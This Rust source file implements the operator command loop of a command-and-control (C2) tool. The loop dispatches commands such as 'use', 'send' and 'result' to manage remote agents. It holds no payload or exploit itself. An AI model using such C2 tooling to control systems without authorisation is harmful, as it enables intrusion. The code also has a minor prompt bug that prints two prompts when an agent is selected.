use std::io::{self, Write};
use std::sync::Arc;
use tokio::sync::Mutex;
use shell_words;

use crate::core::c2::C2;
use crate::core::cli::commands;

pub struct C2Cli {
    pub current_agent: u64,
}

impl C2Cli {
    pub async fn run(&mut self, c2: Arc<Mutex<C2>>) {

        println!("=== Welcome to the C2 Command Interface ===\n\n");

        loop {
            if self.current_agent != 0 {
                print!("c2[{}]>", self.current_agent);
            } 
            print!("c2>");
            
            io::stdout().flush().unwrap();

            let mut input = String::new();
            if io::stdin().read_line(&mut input).is_err() {
                eprintln!("Failed to read input.");
                continue;
            }


            let parsed = match shell_words::split(input.trim()) {
                Ok(p) => p,
                Err(e) => {
                    eprint!("Error parsing input {}", e);
                    continue;
                }
            };

            let mut parts = parsed.into_iter();
            let cmd = parts.next();

            match cmd.as_deref() {
                Some("list") => commands::handle_list_command(&c2).await,
                Some("exit") | Some("quit") => { println!("Exiting C2 CLI."); break; }
                Some("help") => commands::handle_help_command().await,
                Some("show") => commands::handle_show_command(&c2, parts).await,
                Some("remove") => commands::handle_remove_command(&self, &c2, parts).await,
                Some("home") => commands::handle_home_command(self).await,
                Some("use") => commands::handle_use_command(self, &c2, parts).await,
                Some("send") => commands::handle_send_command(&self, &c2, parts).await,
                Some("result") => commands::handle_result_command(&self, &c2, parts).await,
                Some(other) => {println!("Unknown command: '{}'", other);}
                None => {}
            }
        }
    }
}